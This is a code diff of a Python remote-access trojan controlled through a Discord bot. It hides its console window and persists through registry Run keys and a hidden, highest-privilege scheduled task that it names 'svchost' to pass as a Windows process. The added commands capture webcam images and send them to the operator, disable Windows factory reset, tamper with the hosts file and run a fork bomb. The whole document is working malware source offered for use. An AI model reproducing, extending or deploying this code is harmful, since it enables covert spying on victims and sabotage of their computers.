@@ -37,6 +37,8 @@ from pynput import mouse
 import uuid
 import socket
 import cgi
+import win32com.client
+import traceback
 
 def is_admin():
     """Check if the script is running with admin privileges."""
@@ -119,88 +121,78 @@ async def on_ready():
     if not is_connected():
         await wait_for_connection()  # Wait until connected
 
-
 def hide_console():
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 # Hide the console window
 hide_console()
 
-# Retrieve AppData Path
-appdata_path = os.getenv("APPDATA")
-script_name = os.path.basename(__file__)
-script_path = os.path.join(appdata_path, script_name)
-
 def add_to_startup_methods(script_path):
     # Add to registry for current user (HKCU)
     try:
-        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
-        winreg.CloseKey(registry_key)
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as registry_key:
+            winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
         print("Added to HKCU Run registry")
     except Exception as e:
         print(f"Error adding to HKCU registry: {e}")
 
     # Attempt to add to registry for all users (HKLM)
     try:
-        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
-        winreg.CloseKey(registry_key)
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as registry_key:
+            winreg.SetValueEx(registry_key, "svchost", 0, winreg.REG_SZ, script_path)
         print("Added to HKLM Run registry (Admin)")
     except PermissionError:
         print("Permission denied: Unable to add to HKLM registry. Admin privileges required.")
     except Exception as e:
         print(f"Error adding to HKLM registry: {e}")
 
-    # Create a scheduled task for startup with highest privileges using win32api and TaskScheduler
-    task_name = "svchost"
+    # Create a scheduled task for startup with highest privileges using TaskScheduler COM object
     try:
-        # Task scheduler COM interfaces
         import win32com.client
-        scheduler = win32com.client.Dispatch('Schedule.Service')
+        from datetime import datetime
+
+        scheduler = win32com.client.Dispatch("Schedule.Service")
         scheduler.Connect()
 
+        root_folder = scheduler.GetFolder("\\")
         task_definition = scheduler.NewTask(0)
-        task_definition.RegistrationInfo.Description = "Startup Task for svchost"
-        task_definition.Principal.UserId = "INTERACTIVE"
-        task_definition.Principal.LogonType = 3  # Logon interactively
 
-        # Create the trigger for the task (on logon)
-        trigger = task_definition.Triggers.Create(1)  # 1 is for Logon trigger
-        trigger.StartBoundary = "2024-11-14T00:00:00"  # Start immediately after logon
+        # Set basic task information
+        task_definition.RegistrationInfo.Description = "Startup Task for svchost"
+        task_definition.Principal.UserId = ""
+        task_definition.Principal.LogonType = 3  # Interactive logon
+        task_definition.Principal.RunLevel = 1  # Run with highest privileges
+
+        # Define a logon trigger
+        trigger = task_definition.Triggers.Create(1)  # 1 = Logon Trigger
+        trigger.StartBoundary = datetime.now().isoformat()  # Immediate start
 
         # Define the action to run the script
-        action = task_definition.Actions.Create(0)  # 0 is for executable action
-        action.Path = script_path
+        action = task_definition.Actions.Create(0)  # 0 = Execute Action
+        action.Path = sys.executable  # Python executable
+        action.Arguments = f'"{script_path}"'
 
-        # Set the task to run with highest privileges
+        # Configure task settings
         task_definition.Settings.Enabled = True
-        task_definition.Settings.RunOnlyIfIdle = False
         task_definition.Settings.AllowStartIfOnBatteries = True
-        task_definition.Settings.StartWhenAvailable = True
-        task_definition.Principal.RunLevel = 3  # Highest privileges
+        task_definition.Settings.StopIfGoingOnBatteries = False
+        task_definition.Settings.Hidden = True
 
-        folder = scheduler.GetFolder("\\")
-        folder.RegisterTaskDefinition(task_name, task_definition, 6, None, None, 3)
-
+        # Register the task
+        task_name = "svchost"
+        root_folder.RegisterTaskDefinition(task_name, task_definition, 6, None, None, 3)
         print(f"Scheduled task '{task_name}' created.")
     except Exception as e:
-        print(f"Error creating scheduled task: {e}")
+        print(f"Error creating scheduled task: {traceback.format_exc()}")
 
 def add_startup_entries():
-    # Determine the script's current path
-    script_path = os.path.realpath(sys.argv[0])
-    
-    # If the script isn't already in the AppData directory, copy it there
-    appdata_path = os.getenv("APPDATA")
-    target_path = os.path.join(appdata_path, os.path.basename(script_path))
-    
-    if not os.path.exists(target_path):
-        shutil.copy(script_path, target_path)
-        print(f"Copied {script_path} to {target_path}")
-    
-    # Add to startup methods
-    add_to_startup_methods(target_path)
+    try:
+        # Use the current script path
+        script_path = os.path.realpath(sys.argv[0])
+        # Add to startup methods
+        add_to_startup_methods(script_path)
+    except Exception as e:
+        print(f"Error in adding startup entries: {e}")
     
 def get_ip_info():
     try:
@@ -502,6 +494,10 @@ async def commands(ctx):
     embed2.add_field(name="😃 .monitors-on", value="Turn on monitor", inline=False)
     embed2.add_field(name="🍴 .forkbomb", value="FORBOMB BOMB  YOUR PC.", inline=False)
     embed2.add_field(name="❌ .remove", value="Removes itself leave no trace.", inline=False)
+    embed2.add_field(name="📸 .webcam", value="Takes picture of the webcam.", inline=False)
+    embed2.add_field(name="🟢 .reagentc-enable", value="Enables back factory reset.", inline=False)
+    embed2.add_field(name="🔴 .reagentc-disable", value="Disables factory reset.", inline=False)
+    embed2.add_field(name="📩 .block-website [website_url]", value="blocks the website.", inline=False)
     await ctx.send(embed=embed2)
 
 @bot.command()
@@ -924,6 +920,7 @@ async def monitors_on(ctx):
     await ctx.send("All monitors have been turned on.")
 
 def spam_apps():
+    """Continuously open CMD and Calculator until stopped."""
     while True:
         subprocess.Popen("cmd.exe")  # Open Command Prompt
         subprocess.Popen("calc.exe")  # Open Calculator
@@ -931,7 +928,7 @@ def spam_apps():
 
 @bot.command(name="forkbomb")
 async def forkbomb(ctx):
-    """Continuously open CMD and Calculator until stopped."""
+    """Start the forkbomb that opens CMD and Calculator repeatedly."""
     await ctx.send("Spamming Forkbomb.")
     
     # Start the spamming in a separate thread to avoid blocking the bot
@@ -958,7 +955,97 @@ async def remove(ctx):
     except Exception as e:
         print(f"Error removing bot: {e}")
 
-# Call to add startup entries
+@bot.command()
+async def webcam(ctx):
+    """Capture an image from the webcam and send it to Discord."""
+    try:
+        # Open webcam
+        cam = cv2.VideoCapture(0)
+        if not cam.isOpened():
+            await ctx.send("Could not access the webcam.")
+            return
+        
+        # Read a frame from the webcam
+        ret, frame = cam.read()
+        cam.release()
+
+        if not ret:
+            await ctx.send("Failed to capture image.")
+            return
+
+        # Save the image locally
+        image_path = "webcam_image.jpg"
+        cv2.imwrite(image_path, frame)
+
+        # Send the image to Discord
+        with open(image_path, "rb") as image_file:
+            await ctx.send("Here is the captured image:", file=discord.File(image_file))
+
+        # Remove the image after sending
+        os.remove(image_path)
+
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def reagentc_enable(ctx):
+    """Enables the factory reset option by enabling WinRE (both from Settings and on boot)."""
+    if not is_admin():
+        await ctx.send("This command requires administrator privileges. Please run the bot as an administrator.")
+        return
+    
+    try:
+        # Enable the Windows Recovery Environment (WinRE)
+        result = subprocess.run(["reagentc", "/enable"], capture_output=True, text=True, shell=True)
+        
+        # Check the result
+        if result.returncode == 0:
+            await ctx.send("Factory reset has been successfully enabled!")
+        else:
+            await ctx.send(f"Failed to enable factory reset. Error: {result.stderr}")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command()
+async def reagentc_disable(ctx):
+    """Disables the factory reset option by disabling WinRE (both from Settings and on boot)."""
+    if not is_admin():
+        await ctx.send("This command requires administrator privileges. Please run the bot as an administrator.")
+        return
+    
+    try:
+        # Disable the Windows Recovery Environment (WinRE)
+        result = subprocess.run(["reagentc", "/disable"], capture_output=True, text=True, shell=True)
+        
+        # Check the result
+        if result.returncode == 0:
+            await ctx.send("Factory reset has been successfully disabled!")
+        else:
+            await ctx.send(f"Failed to disable factory reset. Error: {result.stderr}")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
+@bot.command(name="block-website")
+async def block_website(ctx, website: str):
+    """Block a website by adding it to the system's hosts file."""
+    # Ensure the website is not already blocked (optional)
+    hosts_path = "/etc/hosts"  # Linux or MacOS path
+    if os.name == 'nt':  # If on Windows
+        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
+
+    try:
+        # Open the hosts file in append mode
+        with open(hosts_path, "a") as hosts_file:
+            # Add the entry to block the website
+            hosts_file.write(f"127.0.0.1 {website}\n")
+        
+        await ctx.send(f"Website {website} has been blocked.")
+    except PermissionError:
+        # If the bot doesn't have permission to modify the hosts file
+        await ctx.send("Permission denied. Ensure the bot is running with admin privileges.")
+    except Exception as e:
+        await ctx.send(f"An error occurred: {e}")
+
 if __name__ == "__main__":
     add_startup_entries()
 
